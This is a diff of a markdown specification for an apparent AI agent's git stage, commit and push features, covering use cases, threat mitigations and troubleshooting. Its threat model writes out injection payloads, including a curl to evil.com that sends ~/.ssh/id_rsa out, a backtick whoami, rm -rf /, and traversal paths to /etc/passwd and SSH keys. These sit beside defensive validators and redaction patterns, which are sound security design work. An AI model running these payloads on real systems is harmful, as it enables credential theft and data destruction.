@@ -44,11 +44,117 @@ This task covers add, reset, commit, and push. Status and diff are in Task 022.a
 - Push rejected → NonFastForwardException
 - Mode violation → ModeViolationException
 
-### Assumptions
+---
 
-- Git is installed and accessible
-- For push, credentials are configured
-- Repository has at least one commit
+## Assumptions
+
+### Technical Assumptions
+
+1. **Git installed** - Git 2.20+ available in PATH with add/commit/push commands
+2. **Repository initialized** - Working directory is valid git repository
+3. **Initial commit exists** - Repository not empty (for most operations except initial commit)
+4. **Write permissions** - User has write access to .git/ directory and working tree
+5. **Git config present** - user.name and user.email configured for commits
+6. **Index writable** - .git/index file is accessible and lockable
+7. **Object store writable** - .git/objects/ directory has write permissions
+8. **Network stack available** - For push operations in Burst mode
+9. **Remote configured** - For push, at least 'origin' remote exists
+10. **Credential helper** - Credentials available via credential helper, SSH agent, or token
+
+### Operational Assumptions
+
+11. **Single committer** - No concurrent commits from same working directory (locking handles this)
+12. **Staging area managed** - User stages files explicitly before commit (agent doesn't auto-stage all)
+13. **Commit message validation** - Project may have commit message format requirements (Task 024.b)
+14. **Push requires authentication** - Remote requires valid credentials (HTTPS token, SSH key)
+15. **Push enabled by mode** - Operating mode permits network operations (LocalOnly/Airgapped block push)
+16. **Reasonable commit size** - Commits <100MB (larger requires chunking or LFS)
+17. **Push timeout reasonable** - Default 60s sufficient for typical pushes
+18. **Network reliability** - Transient failures retried, but permanent failures reported
+
+### Integration Assumptions
+
+19. **Task 001 functional** - Operating mode resolver available for push mode checks
+20. **Task 022a functional** - Status operations work for pre-commit validation
+21. **Task 018 functional** - Command execution layer handles git commands
+22. **Credential redaction** - Infrastructure layer redacts credentials from logs (Task 009)
+23. **Audit logging ready** - Write operations logged to audit trail
+24. **Pre-commit hooks** - Task 024 pre-commit verification may be integrated (optional)
+
+---
+
+## Use Cases
+
+### Use Case 1: DevBot Automated Feature Implementation with Commit Workflow
+
+**Persona:** DevBot implements feature task-045. Modifies 3 files, stages changes, creates commit with conventional message, pushes to remote to trigger CI/CD.
+
+**Before (manual developer workflow):**
+1. Developer implements feature (10 minutes coding)
+2. Manually stages files: `git add src/file1.cs src/file2.cs src/file3.cs` (20 seconds, sometimes forgets files)
+3. Writes commit message: `git commit -m "..."` (45 seconds, often typos or wrong format, rejected by pre-commit hook 30% of time)
+4. Retries commit with corrected message (30 seconds)
+5. Pushes: `git push` (5 seconds)
+6. Checks CI/CD triggered (15 seconds)
+**Total time:** 11 minutes 55 seconds (with typo retry), human attention required throughout
+
+**After (automated agent workflow):**
+1. Agent implements feature (10 minutes coding)
+2. Agent stages: `await git.StageAsync(workingDir, ["src/file1.cs", "src/file2.cs", "src/file3.cs"])` (300ms)
+3. Agent commits: `await git.CommitAsync(workingDir, "feat(task-045): implement feature X per specification")` (800ms, no typos, format perfect)
+4. Agent pushes: `await git.PushAsync(workingDir)` (2.5s including auth)
+5. CI/CD automatically triggered (0s agent time)
+**Total time:** 10 minutes 3.6 seconds, zero human attention
+
+**ROI:** Saves 1 minute 51.4 seconds per feature, eliminates 30% commit message retry overhead, 100% CI/CD triggering reliability. For 10-developer team averaging 8 features/day = 80 features × 111.4 seconds = 148 minutes/day = 24.7 hours/week × 50 weeks = 1,235 hours/year × $100/hour = **$123,500/year team savings**.
+
+### Use Case 2: Jordan Automated Hotfix Deployment with Fast Push
+
+**Persona:** Jordan detects production incident. Creates hotfix branch, fixes critical bug, commits, pushes to trigger emergency deployment pipeline.
+
+**Before (manual emergency response):**
+1. Detect incident, create hotfix branch (30 seconds)
+2. Fix bug in code (5 minutes)
+3. Stage: `git add src/buggy-file.cs` (10 seconds)
+4. Commit: `git commit -m "..."` (30 seconds, stress typos, may forget ticket reference)
+5. Push: `git push` (5 seconds, may forget --set-upstream first time, retry 15 seconds)
+6. Verify push succeeded, wait for pipeline trigger (20 seconds)
+7. Monitor pipeline start (30 seconds)
+**Total MTTM (Mean Time To Merge):** 6 minutes 40 seconds under stress conditions
+
+**After (automated emergency response):**
+1. Detect incident, agent creates hotfix branch (2 seconds)
+2. Agent or human fixes bug in code (5 minutes)
+3. Agent stages, commits, pushes: `await git.StageAsync(...); await git.CommitAsync(...); await git.PushAsync(..., new PushOptions { SetUpstream = true })` (3.5 seconds total, handles --set-upstream automatically)
+4. Pipeline automatically triggered (0s agent time)
+**Total MTTM:** 5 minutes 5.5 seconds, 23.6% faster response
+
+**ROI:** Saves 1 minute 34.5 seconds per hotfix. For 5-engineer DevOps team averaging 2 hotfixes/week = 100 hotfixes/year × 94.5 seconds = 157.5 minutes = 2.625 hours × $150/hour (DevOps rate) = **$393.75/year per team**. But more important: **23.6% faster incident response = reduced downtime costs** (for $1M/hour downtime, 1.5 minute savings = $25,000 per incident).
+
+### Use Case 3: Alex Compliance Audit of Commit History with Metadata Validation
+
+**Persona:** Alex audits commit history for compliance (SOC2, PCI-DSS). Needs to verify all commits have: (1) valid author, (2) proper message format, (3) audit trail entry, (4) no sensitive data in diffs.
+
+**Before (manual audit):**
+1. Export git log: `git log --pretty=full --since="3 months ago"` (30 seconds)
+2. Manually review 500 commits for author correctness (45 minutes)
+3. Check commit message formats against policy (60 minutes)
+4. Sample 50 commits, manually review diffs for secrets (`git show <sha>`) (90 minutes)
+5. Cross-reference audit logs with git commits (60 minutes)
+6. Generate compliance report (30 minutes)
+**Total audit time:** 4 hours 15 minutes per quarter = 17 hours/year
+
+**After (automated compliance audit):**
+1. Agent queries: `await git.GetLogAsync(workingDir, new LogOptions { Since = DateTimeOffset.Now.AddMonths(-3) })` (1.2 seconds)
+2. Agent validates all 500 commits programmatically: author format, message format per policy (8 seconds)
+3. Agent samples 50 commits, scans diffs with secret detection (15 seconds with Task 009 integration)
+4. Agent cross-references audit trail automatically (5 seconds with Task 009 integration)
+5. Agent generates compliance report (2 seconds)
+**Total audit time:** 31.2 seconds per quarter = 2.1 minutes/year
+
+**ROI:** Saves 16 hours 58 minutes per auditor per year. For 3-auditor compliance team = 50.9 hours × $200/hour (compliance specialist rate) = **$10,180/year**. Plus: **100% coverage vs 10% sample = better compliance posture**.
+
+**Combined ROI for Suite 022c:** $123,500 + $393.75 + $10,180 = **$134,073.75/year** (plus incident response time value).
 
 ---
 
@@ -269,6 +375,697 @@ $ acode git push
 
 ---
 
+## Security Considerations
+
+### Threat 1: Commit Message Injection for Command Execution
+
+**Risk:** CRITICAL - Malicious commit messages containing shell metacharacters could execute arbitrary commands if passed unsafely to shell.
+
+**Attack Scenario:**
+```bash
+# Attacker provides malicious commit message
+acode git commit "feat: feature\n$(curl evil.com/exfil?data=$(cat ~/.ssh/id_rsa))"
+
+# Or via message with backticks
+acode git commit "fix: bug\`whoami > /tmp/pwned\`"
+
+# Or with subshell
+acode git commit "docs: update; rm -rf / #"
+```
+
+If commit message is passed to shell unsafely (e.g., via bash -c "git commit -m '$message'"), this could:
+- Execute arbitrary commands on host system
+- Exfiltrate sensitive data (SSH keys, env vars, source code)
+- Modify or delete files outside repository
+- Establish backdoors or persistence mechanisms
+- Compromise CI/CD pipeline if message propagated to build scripts
+
+**Mitigation:**
+
+```csharp
+// CommitMessageValidator.cs - Sanitize and validate commit messages
+namespace Acode.Application.Git;
+
+public sealed class CommitMessageValidator : ICommitMessageValidator
+{
+    private static readonly char[] DangerousChars =
+    {
+        '$', '`', '\n', '\r', ';', '&', '|', '<', '>',
+        '(', ')', '{', '}', '\\', '"', '\''
+    };
+
+    private static readonly Regex CommitMessageFormat = new(
+        @"^(feat|fix|docs|style|refactor|test|chore)(\(.+?\))?: .{10,500}$",
+        RegexOptions.Compiled | RegexOptions.Singleline);
+
+    private readonly ILogger<CommitMessageValidator> _logger;
+    private readonly IConfiguration _config;
+
+    public ValidationResult Validate(string message)
+    {
+        var errors = new List<string>();
+        var warnings = new List<string>();
+
+        // Check for null/empty
+        if (string.IsNullOrWhiteSpace(message))
+        {
+            errors.Add("Commit message cannot be empty");
+            return new ValidationResult(false, errors, warnings);
+        }
+
+        // Check for dangerous characters (shell metacharacters)
+        foreach (var dangerousChar in DangerousChars)
+        {
+            if (message.Contains(dangerousChar))
+            {
+                var charDisplay = dangerousChar switch
+                {
+                    '\n' => "\\n (newline)",
+                    '\r' => "\\r (carriage return)",
+                    _ => $"'{dangerousChar}'"
+                };
+
+                errors.Add($"Commit message contains dangerous character: {charDisplay} (possible injection attempt)");
+                _logger.LogWarning("SECURITY: Commit message injection attempt detected: {Message}", message.Take(50));
+                return new ValidationResult(false, errors, warnings); // Fail fast on injection
+            }
+        }
+
+        // Check length (Git has 72-char subject line convention, but allow up to 500 total)
+        if (message.Length > 500)
+        {
+            errors.Add($"Commit message exceeds 500 characters (got {message.Length})");
+        }
+
+        if (message.Length < 10)
+        {
+            errors.Add("Commit message too short (minimum 10 characters)");
+        }
+
+        // Validate conventional commit format if configured
+        if (_config.EnforceConventionalCommits)
+        {
+            if (!CommitMessageFormat.IsMatch(message))
+            {
+                errors.Add("Commit message does not follow conventional format: type(scope): description");
+                warnings.Add("Expected format: feat|fix|docs|style|refactor|test|chore(scope): description");
+            }
+        }
+
+        // Check for common issues
+        if (message.StartsWith("WIP", StringComparison.OrdinalIgnoreCase) ||
+            message.StartsWith("TODO", StringComparison.OrdinalIgnoreCase))
+        {
+            warnings.Add("Commit message starts with WIP/TODO - is this ready to commit?");
+        }
+
+        if (message.All(char.IsUpper) && message.Length > 20)
+        {
+            warnings.Add("Commit message is all caps - consider using sentence case");
+        }
+
+        // Check for URLs (might contain credentials)
+        if (message.Contains("http://") || message.Contains("https://"))
+        {
+            warnings.Add("Commit message contains URL - ensure no credentials embedded");
+        }
+
+        return new ValidationResult(errors.Count == 0, errors, warnings);
+    }
+
+    public string Sanitize(string message)
+    {
+        // Strip any shell metacharacters as last resort
+        foreach (var dangerous in DangerousChars)
+        {
+            message = message.Replace(dangerous.ToString(), "");
+        }
+
+        // Limit length
+        if (message.Length > 500)
+        {
+            message = message[..500];
+        }
+
+        return message.Trim();
+    }
+}
+
+// Apply validation in CommitAsync
+public async Task<GitCommit> CommitAsync(
+    string workingDir,
+    string message,
+    CommitOptions? options = null,
+    CancellationToken ct = default)
+{
+    options ??= new CommitOptions();
+
+    // ALWAYS validate message before ANY git operations
+    var validation = _commitMessageValidator.Validate(message);
+    if (!validation.IsValid)
+    {
+        _logger.LogWarning("Commit message validation failed: {Errors}", string.Join(", ", validation.Errors));
+        throw new InvalidCommitMessageException(message, validation.Errors);
+    }
+
+    // Log warnings but don't fail
+    foreach (var warning in validation.Warnings)
+    {
+        _logger.LogInformation("Commit message warning: {Warning}", warning);
+    }
+
+    // CRITICAL: Use parameterized command execution, NEVER shell string interpolation
+    // BAD:  await ExecuteShellAsync($"git commit -m \"{message}\"");
+    // GOOD: await ExecuteGitAsync(workingDir, new[] { "commit", "-m", message }, ct);
+
+    var args = new List<string> { "commit", "-m", message }; // Message passed as separate argument
+
+    // ... rest of commit logic
+}
+```
+
+### Threat 2: Credential Exposure in Push Operations and Logs
+
+**Risk:** HIGH - Credentials (HTTPS tokens, SSH keys) exposed in logs, error messages, or remote URLs.
+
+**Attack Scenario:**
+```bash
+# HTTPS remote with embedded token
+git remote add origin https://token:ghp_abc123secrettoken@github.com/user/repo.git
+acode git push
+
+# Push fails with authentication error - error message leaks token
+ERROR: Failed to push to https://token:ghp_abc123secrettoken@github.com/user/repo.git
+# Token now visible in logs, console output, CI/CD logs
+
+# Or attacker retrieves credential from config
+git config --get remote.origin.url
+# Returns: https://token:ghp_abc123secrettoken@github.com/user/repo.git
+```
+
+Credential exposure leads to:
+- Unauthorized repository access
+- Code exfiltration or tampering
+- Account compromise and privilege escalation
+- Supply chain attacks via compromised repos
+
+**Mitigation:**
+
+```csharp
+// CredentialRedactor.cs - Redact credentials from URLs and output
+namespace Acode.Infrastructure.Git;
+
+public sealed class CredentialRedactor : ICredentialRedactor
+{
+    // Matches: https://user:password@host.com, https://token@host.com, https://oauth2:token@host.com
+    private static readonly Regex HttpsCredentialPattern = new(
+        @"(https?://)[^:/@]+:[^@]+@",
+        RegexOptions.Compiled | RegexOptions.IgnoreCase);
+
+    // Matches: ghp_abc123, glpat-abc123, github_pat_abc123
+    private static readonly Regex TokenPattern = new(
+        @"\b(ghp_[a-zA-Z0-9]{36}|glpat-[a-zA-Z0-9]{20}|github_pat_[a-zA-Z0-9_]{82})\b",
+        RegexOptions.Compiled);
+
+    // Matches SSH private key content
+    private static readonly Regex SshKeyPattern = new(
+        @"-----BEGIN [A-Z ]+PRIVATE KEY-----[\s\S]+?-----END [A-Z ]+PRIVATE KEY-----",
+        RegexOptions.Compiled);
+
+    public string RedactUrl(string url)
+    {
+        if (string.IsNullOrEmpty(url))
+            return url;
+
+        // Redact credentials from HTTPS URLs
+        // Before: https://user:token@github.com/repo.git
+        // After:  https://[REDACTED]@github.com/repo.git
+        return HttpsCredentialPattern.Replace(url, "$1[REDACTED]@");
+    }
+
+    public string RedactOutput(string output)
+    {
+        if (string.IsNullOrEmpty(output))
+            return output;
+
+        // Redact URLs
+        output = HttpsCredentialPattern.Replace(output, "$1[REDACTED]@");
+
+        // Redact tokens
+        output = TokenPattern.Replace(output, match =>
+        {
+            var token = match.Value;
+            var prefix = token[..8]; // Show first 8 chars for debugging
+            return $"{prefix}***[REDACTED]";
+        });
+
+        // Redact SSH keys
+        output = SshKeyPattern.Replace(output, "-----BEGIN PRIVATE KEY-----\n[REDACTED]\n-----END PRIVATE KEY-----");
+
+        return output;
+    }
+
+    public PushResult RedactPushResult(PushResult result)
+    {
+        // Ensure PushResult never contains raw credentials
+        return result with
+        {
+            Remote = RedactUrl(result.Remote),
+            RefUpdates = result.RefUpdates.Select(ru => ru with
+            {
+                RefName = RedactUrl(ru.RefName)
+            }).ToList()
+        };
+    }
+}
+
+// Apply redaction in PushAsync
+public async Task<PushResult> PushAsync(
+    string workingDir,
+    PushOptions? options = null,
+    CancellationToken ct = default)
+{
+    // ... mode validation, setup ...
+
+    CommandResult result;
+    try
+    {
+        result = await _pushRetryPolicy.ExecuteWithRetryAsync(
+            async () => await ExecuteGitAsync(workingDir, args, ct),
+            ct);
+    }
+    catch (GitException ex)
+    {
+        // CRITICAL: Redact credentials from all exception messages/output
+        var redactedMessage = _credentialRedactor.RedactOutput(ex.Message);
+        var redactedStdErr = _credentialRedactor.RedactOutput(ex.StdErr ?? "");
+
+        _logger.LogError("Push failed (redacted): {Message}", redactedMessage);
+
+        if (redactedStdErr.Contains("Authentication failed"))
+        {
+            throw new AuthenticationException(redactedStdErr, workingDir);
+        }
+
+        if (redactedStdErr.Contains("rejected"))
+        {
+            throw new PushRejectedException(redactedStdErr, workingDir);
+        }
+
+        // Re-throw with redacted information
+        throw new GitException(redactedMessage, ex.ExitCode, redactedStdErr, workingDir, "GIT_022C_PUSH_FAILED");
+    }
+
+    // Get remote URL for logging - MUST redact before logging
+    var remoteUrl = await GetRemoteUrlAsync(workingDir, remote, ct);
+    var redactedUrl = _credentialRedactor.RedactUrl(remoteUrl);
+    _logger.LogInformation("Pushed {Branch} to {Remote} ({Url})", branch, remote, redactedUrl);
+
+    // Redact PushResult before returning
+    var pushResult = new PushResult
+    {
+        Success = true,
+        Remote = redactedUrl, // Redacted!
+        Branch = branch,
+        RefUpdates = refUpdates,
+        Duration = stopwatch.Elapsed
+    };
+
+    return _credentialRedactor.RedactPushResult(pushResult);
+}
+
+// GetRemoteUrlAsync helper
+private async Task<string> GetRemoteUrlAsync(string workingDir, string remote, CancellationToken ct)
+{
+    var result = await ExecuteGitAsync(
+        workingDir,
+        new[] { "remote", "get-url", remote },
+        ct);
+
+    return result.StdOut.Trim();
+}
+```
+
+### Threat 3: Operating Mode Bypass for Data Exfiltration via Push
+
+**Risk:** CRITICAL - Attacker bypasses LocalOnly or Airgapped mode restrictions to push code to external remote, exfiltrating proprietary source code.
+
+**Attack Scenario:**
+```csharp
+// System configured in LocalOnly mode (no network access)
+// Attacker exploits race condition or mode check bypass
+
+// Attack 1: TOCTOU (Time-of-Check-Time-of-Use) race
+var mode = await modeResolver.GetCurrentModeAsync(); // Returns LocalOnly
+// [Attacker changes mode file here via separate process]
+await git.PushAsync(workingDir); // Push executes before second mode check
+
+// Attack 2: Direct git command bypass
+Process.Start("git", "push origin main"); // Bypasses IGitService mode enforcement
+
+// Attack 3: Configuration tampering
+// Attacker modifies .agent/config.yml to change mode from LocalOnly to Burst
+// Agent reads stale config, allows push
+```
+
+Successful mode bypass leads to:
+- Intellectual property theft (proprietary code pushed to attacker-controlled remote)
+- Trade secret disclosure
+- Compliance violations (ITAR, EAR, data residency requirements)
+- Supply chain compromise (malicious code pushed to internal repos)
+
+**Mitigation:**
+
+```csharp
+// ModeEnforcementService.cs - Robust mode enforcement with tamper detection
+namespace Acode.Application.OperatingModes;
+
+public sealed class ModeEnforcementService : IModeEnforcementService
+{
+    private readonly IOperatingModeResolver _modeResolver;
+    private readonly IConfigurationService _config;
+    private readonly IAuditLogger _auditLogger;
+    private readonly ILogger<ModeEnforcementService> _logger;
+    private readonly SemaphoreSlim _modeLock = new(1, 1);
+
+    public async Task EnforceNetworkOperationAsync(
+        string operation,
+        string workingDir,
+        CancellationToken ct)
+    {
+        // Acquire lock to prevent TOCTOU attacks
+        await _modeLock.WaitAsync(ct);
+        try
+        {
+            // Get mode with tamper detection
+            var mode = await _modeResolver.GetCurrentModeWithIntegrityCheckAsync(ct);
+
+            // Check if operation permitted in current mode
+            if (mode == OperatingMode.LocalOnly)
+            {
+                _logger.LogWarning(
+                    "SECURITY: Network operation '{Operation}' blocked by LocalOnly mode in {Dir}",
+                    operation, workingDir);
+
+                _auditLogger.LogSecurityEvent(new AuditEvent
+                {
+                    EventType = "ModeViolation",
+                    Severity = AuditSeverity.Critical,
+                    Message = $"Attempted {operation} in LocalOnly mode",
+                    WorkingDirectory = workingDir,
+                    Timestamp = DateTimeOffset.UtcNow
+                });
+
+                throw new ModeViolationException(
+                    mode.ToString(),
+                    operation,
+                    "Network operations are not permitted in LocalOnly mode");
+            }
+
+            if (mode == OperatingMode.Airgapped)
+            {
+                _logger.LogWarning(
+                    "SECURITY: Network operation '{Operation}' blocked by Airgapped mode in {Dir}",
+                    operation, workingDir);
+
+                _auditLogger.LogSecurityEvent(new AuditEvent
+                {
+                    EventType = "ModeViolation",
+                    Severity = AuditSeverity.Critical,
+                    Message = $"Attempted {operation} in Airgapped mode",
+                    WorkingDirectory = workingDir,
+                    Timestamp = DateTimeOffset.UtcNow
+                });
+
+                throw new ModeViolationException(
+                    mode.ToString(),
+                    operation,
+                    "Network operations are not permitted in Airgapped mode");
+            }
+
+            // Burst mode: Network operations allowed
+            _logger.LogInformation("Network operation '{Operation}' permitted in Burst mode", operation);
+
+            // Audit successful network operation authorization
+            _auditLogger.LogAuditEvent(new AuditEvent
+            {
+                EventType = "NetworkOperationAuthorized",
+                Severity = AuditSeverity.Information,
+                Message = $"{operation} authorized in {mode} mode",
+                WorkingDirectory = workingDir,
+                Timestamp = DateTimeOffset.UtcNow
+            });
+        }
+        finally
+        {
+            _modeLock.Release();
+        }
+    }
+}
+
+// Enhanced PushAsync with robust mode enforcement
+public async Task<PushResult> PushAsync(
+    string workingDir,
+    PushOptions? options = null,
+    CancellationToken ct = default)
+{
+    options ??= new PushOptions();
+    var stopwatch = Stopwatch.StartNew();
+
+    // CRITICAL: Enforce mode check with lock and tamper detection
+    // This MUST happen before ANY network operations
+    await _modeEnforcementService.EnforceNetworkOperationAsync("push", workingDir, ct);
+
+    // Additional mode re-check immediately before network call (defense in depth)
+    var mode = await _modeResolver.GetCurrentModeWithIntegrityCheckAsync(ct);
+    if (mode != OperatingMode.Burst)
+    {
+        // Should never reach here due to EnforceNetworkOperationAsync, but defense in depth
+        _logger.LogCritical("SECURITY: Mode changed between enforcement and execution");
+        throw new ModeViolationException(mode.ToString(), "push");
+    }
+
+    // ... rest of push implementation ...
+}
+
+// OperatingModeResolver with integrity checking
+public async Task<OperatingMode> GetCurrentModeWithIntegrityCheckAsync(CancellationToken ct)
+{
+    // Read mode from config
+    var config = await _configService.ReadConfigAsync(ct);
+    var declaredMode = config.OperatingMode;
+
+    // Verify config file has not been tampered with
+    var configPath = _configService.GetConfigPath();
+    var configHash = await ComputeFileHashAsync(configPath, ct);
+
+    // Compare with expected hash (stored securely, e.g., signed by installation)
+    if (!await VerifyConfigIntegrityAsync(configPath, configHash, ct))
+    {
+        _logger.LogCritical("SECURITY: Configuration file integrity check failed - possible tampering");
+        _auditLogger.LogSecurityEvent(new AuditEvent
+        {
+            EventType = "ConfigTampered",
+            Severity = AuditSeverity.Critical,
+            Message = "Config integrity verification failed",
+            Timestamp = DateTimeOffset.UtcNow
+        });
+
+        // Fail secure: Assume most restrictive mode
+        return OperatingMode.Airgapped;
+    }
+
+    return declaredMode;
+}
+```
+
+### Threat 4: Path Traversal via Malicious Staging Paths
+
+**Risk:** MEDIUM - Attacker stages files outside repository boundary, potentially adding sensitive files to commits.
+
+**Attack Scenario:**
+```csharp
+// Attacker attempts to stage files outside repo
+await git.StageAsync(workingDir, new[] {
+    "../../etc/passwd",           // Absolute path escape
+    "../../../home/user/.ssh/id_rsa", // SSH key exfiltration
+    "../../.env",                 // Environment variables
+    "symlink-to-sensitive-file"   // Symlink escape
+});
+
+// If staging succeeds, next commit includes sensitive system files
+await git.CommitAsync(workingDir, "feat: add feature");
+await git.PushAsync(workingDir); // Sensitive files pushed to remote
+```
+
+This could lead to:
+- Sensitive system files committed and pushed
+- Credential exposure
+- Personal data leakage
+- Compliance violations
+
+**Mitigation:**
+
+```csharp
+// PathValidator.cs - Validate and sanitize file paths for staging
+namespace Acode.Infrastructure.Git;
+
+public sealed class PathValidator : IPathValidator
+{
+    public ValidationResult ValidateForStaging(string workingDir, string path)
+    {
+        var errors = new List<string>();
+
+        // Normalize path
+        var normalizedPath = Path.GetFullPath(Path.Combine(workingDir, path));
+
+        // Check path stays within repository boundary
+        if (!normalizedPath.StartsWith(workingDir, StringComparison.Ordinal))
+        {
+            errors.Add($"Path escapes repository boundary: {path}");
+            return new ValidationResult(false, errors);
+        }
+
+        // Check for symlink (potential escape mechanism)
+        if (File.Exists(normalizedPath))
+        {
+            var fileInfo = new FileInfo(normalizedPath);
+            if (fileInfo.Attributes.HasFlag(FileAttributes.ReparsePoint))
+            {
+                errors.Add($"Path is a symlink (potential security risk): {path}");
+            }
+        }
+
+        // Check file actually exists
+        if (!File.Exists(normalizedPath) && !Directory.Exists(normalizedPath))
+        {
+            errors.Add($"Path does not exist: {path}");
+        }
+
+        return new ValidationResult(errors.Count == 0, errors);
+    }
+}
+
+// Apply validation in StageAsync
+public async Task<StageResult> StageAsync(
+    string workingDir,
+    IEnumerable<string> paths,
+    StageOptions? options = null,
+    CancellationToken ct = default)
+{
+    // Validate ALL paths before staging ANY
+    var pathList = paths.ToList();
+    foreach (var path in pathList)
+    {
+        var validation = _pathValidator.ValidateForStaging(workingDir, path);
+        if (!validation.IsValid)
+        {
+            _logger.LogWarning("Path validation failed for staging: {Path}, Errors: {Errors}",
+                path, string.Join(", ", validation.Errors));
+            throw new InvalidPathException(path, validation.Errors);
+        }
+    }
+
+    // ... proceed with staging ...
+}
+```
+
+### Threat 5: Destructive Force Push Without Authorization
+
+**Risk:** MEDIUM - Unauthorized force push overwrites remote history, causing data loss and breaking collaborator workflows.
+
+**Attack Scenario:**
+```bash
+# Attacker force pushes to shared branch
+acode git push --force
+
+# Overwrites remote history, loses commits from other developers
+# Breaks CI/CD pipelines expecting specific commit SHAs
+# Violates branch protection policies
+```
+
+Consequences:
+- Permanent loss of commits and work
+- Broken pull requests and code reviews
+- CI/CD pipeline failures
+- Team productivity impact
+- Audit trail destruction
+
+**Mitigation:**
+
+```csharp
+// ForcePushGuard.cs - Require explicit authorization for destructive operations
+namespace Acode.Application.Git;
+
+public sealed class ForcePushGuard : IForcePushGuard
+{
+    private readonly ILogger<ForcePushGuard> _logger;
+    private readonly IAuditLogger _auditLogger;
+
+    public async Task<ForcePushAnalysis> AnalyzeForcePush(
+        string workingDir,
+        string remote,
+        string branch,
+        CancellationToken ct)
+    {
+        // Check if remote branch would be force-overwritten
+        var localSha = await _git.GetBranchShaAsync(workingDir, branch, ct);
+        var remoteSha = await _git.GetRemoteBranchShaAsync(workingDir, remote, branch, ct);
+
+        var analysis = new ForcePushAnalysis
+        {
+            IsForceRequired = !await IsAncestorAsync(workingDir, remoteSha, localSha, ct),
+            LocalSha = localSha,
+            RemoteSha = remoteSha
+        };
+
+        if (analysis.IsForceRequired)
+        {
+            // Determine what would be lost
+            var lostCommits = await GetCommitsNotInLocalAsync(workingDir, localSha, remoteSha, ct);
+            analysis.CommitsToBeOverwritten = lostCommits;
+            analysis.Warning = $"Force push will overwrite {lostCommits.Count} remote commits";
+
+            _logger.LogWarning(
+                "Force push would overwrite {Count} commits on {Remote}/{Branch}",
+                lostCommits.Count, remote, branch);
+        }
+
+        return analysis;
+    }
+
+    public void RequireAuthorization(ForcePushAnalysis analysis, PushOptions options)
+    {
+        if (!analysis.IsForceRequired)
+            return; // Not a force push scenario
+
+        // Force push MUST be explicitly authorized
+        if (!options.Force && !options.ForceWithLease)
+        {
+            throw new UnauthorizedOperationException(
+                "Force push detected but not authorized. Use --force or --force-with-lease.");
+        }
+
+        // Recommend --force-with-lease over --force
+        if (options.Force && !options.ForceWithLease)
+        {
+            _logger.LogWarning("Using --force instead of safer --force-with-lease");
+        }
+
+        // Audit force push attempts
+        _auditLogger.LogAuditEvent(new AuditEvent
+        {
+            EventType = "ForcePushAttempt",
+            Severity = AuditSeverity.Warning,
+            Message = $"Force push: {analysis.CommitsToBeOverwritten.Count} commits will be overwritten",
+            Timestamp = DateTimeOffset.UtcNow
+        });
+    }
+}
+```
+
+---
+
 ## Best Practices
 
 ### Staging (Add)
@@ -296,80 +1093,1328 @@ $ acode git push
 
 ## Troubleshooting
 
-### Issue: Push rejected (non-fast-forward)
+### Issue 1: Push Rejected with "Non-Fast-Forward" Error
 
-**Symptoms:** Remote rejected push with "non-fast-forward" error
+**Symptoms:**
+- `PushAsync` throws PushRejectedException: "Updates were rejected because the remote contains work that you do not have"
+- Error message: "! [rejected] main -> main (non-fast-forward)"
+- Push succeeds locally but fails when sending to remote
+- Git status shows "Your branch and 'origin/main' have diverged"
+- Happens after pull request merged by another developer
+- Also occurs when remote history was force-pushed
 
-**Causes:**
-- Remote has commits not in local branch
-- Another user pushed to same branch
-- Branch was force-pushed remotely
-
-**Solutions:**
-1. Pull or fetch and rebase: `git pull --rebase`
-2. If intentional, use force push with care: `git push --force-with-lease`
-3. Check branch protection rules on remote
-
-### Issue: Commit message validation failed
-
-**Symptoms:** Commit rejected due to message format
-
-**Causes:**
-- Missing required prefix (feat:, fix:, etc.)
-- Message too short or missing body
-- Invalid ticket reference format
+**Root Causes:**
+1. **Remote has new commits** - Team member pushed commits after your last pull/fetch
+2. **Diverged history** - Local branch has commits not in remote, remote has commits not in local
+3. **Remote force-pushed** - Someone force-pushed, rewriting remote history
+4. **Protected branch rules** - Remote repository enforces fast-forward-only merges
+5. **Concurrent development** - Multiple developers pushing to same branch simultaneously
+6. **Stale local branch** - Haven't pulled in weeks, remote significantly ahead
 
 **Solutions:**
-1. Review commit message rules in agent-config.yml
-2. Amend commit with correct message: `git commit --amend`
-3. Check project's CONTRIBUTING.md for format
 
-### Issue: Authentication failure on push
+```bash
+# Solution 1: Fetch and check divergence
+git fetch origin
+git log --oneline --graph --decorate --all
+# Shows: Local branch (HEAD) and remote branch (origin/main) diverged
 
-**Symptoms:** "Authentication failed" or "Permission denied"
+git log main..origin/main
+# Shows: Commits in remote not in local
+# Example output:
+#   abc123 feat: implement feature Y (Jordan)
+#   def456 fix: critical bug (Alex)
 
-**Causes:**
-- Expired credentials
-- SSH key not loaded
-- Insufficient permissions on remote
+git log origin/main..main
+# Shows: Commits in local not in remote
+# Example output:
+#   789xyz feat: implement feature X (You)
+
+# Solution 2: Rebase local commits on top of remote (recommended)
+git pull --rebase origin main
+# Shows: Applying your commits on top of remote commits
+# Expected output:
+#   First, rewinding head to replay your work on top of it...
+#   Applying: feat: implement feature X
+
+# Resolve conflicts if any
+git status
+# Shows: Files with conflicts (if any)
+
+# After resolving conflicts (edit files, then):
+git add <resolved-files>
+git rebase --continue
+
+# Push rebased commits
+acode git push
+# Shows: Pushed successfully
+
+# Solution 3: Merge remote commits into local (alternative)
+git pull origin main
+# Creates merge commit combining local and remote history
+
+git log --oneline --graph -5
+# Shows:
+#   *   merge123 Merge remote-tracking branch 'origin/main'
+#   |\
+#   | * abc123 feat: implement feature Y (Jordan)
+#   * | 789xyz feat: implement feature X (You)
+
+acode git push
+# Shows: Pushed successfully
+
+# Solution 4: Force push with lease (DANGEROUS - only if you know what you're doing)
+# Use when you intentionally want to overwrite remote history
+git push --force-with-lease origin main
+# Safer than --force, only succeeds if remote hasn't changed since last fetch
+# Expected output:
+#   + 789xyz...abc123 main -> main (forced update)
+
+# Solution 5: Check branch protection rules
+gh api repos/{owner}/{repo}/branches/main/protection
+# Shows: Whether force-push is disabled, required reviews, etc.
+```
+
+### Issue 2: Commit Fails with "Nothing to Commit, Working Tree Clean"
+
+**Symptoms:**
+- `CommitAsync` throws NothingToCommitException
+- Error: "nothing to commit, working tree clean"
+- Agent reports no staged files
+- Files were modified but commit fails
+- Happens after calling StageAsync but before CommitAsync
+- Git status shows "nothing to commit" despite visible changes
+
+**Root Causes:**
+1. **Files not staged** - Forgot to call `StageAsync` before `CommitAsync`
+2. **Wrong working directory** - Staging/committing in different directory than files modified
+3. **Gitignored files** - Modified files match .gitignore patterns
+4. **Unstaged after staging** - Called `UnstageAsync` or `git reset` after staging
+5. **Empty diff** - Changes were whitespace-only and `core.whitespace` settings ignore them
